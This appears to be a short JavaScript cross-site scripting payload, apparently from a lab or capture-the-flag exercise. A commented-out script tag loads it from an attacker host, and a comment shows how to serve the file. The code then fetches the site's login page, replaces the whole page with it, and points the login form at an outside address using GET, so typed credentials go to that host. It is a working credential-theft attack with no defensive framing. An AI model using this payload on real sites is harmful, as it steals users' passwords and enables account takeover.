{/* <script src="http://10.10.10.10/xss.js">
</script> */}
// python3 -m http.server 80

// Make a fetch request to the "login" endpoint
fetch("login").then(res => res.text().then(data => {
    // Replace the HTML content of the entire page with the fetched data
    document.getElementsByTagName("html")[0].innerHTML = data;

    // Modify the action and method attributes of the first form element
    document.getElementsByTagName("form")[0].action = "http://192.168.0.1";
    document.getElementsByTagName("form")[0].method = "get";
}));
